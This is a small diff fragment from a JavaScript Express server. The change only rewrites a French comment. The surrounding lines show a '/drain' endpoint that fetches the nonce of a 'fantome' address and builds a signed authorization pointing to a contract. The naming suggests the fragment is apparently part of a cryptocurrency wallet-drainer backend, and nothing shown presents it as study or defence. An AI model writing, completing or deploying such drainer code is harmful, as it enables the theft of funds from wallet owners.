@@ -64,7 +64,7 @@ app.post("/drain", async (req, res) => {
 
     const authNonce = await provider.getTransactionCount(fantome, "latest");
 
-    // On reprend EXACTEMENT le format produit par authorize() : r/s avec 0x, yParity en hex
+    // Meme forme exacte que ce que produit authorize()
     const authorization = {
       chainId: BigInt(auth.chainId),
       address: CONTRACT,
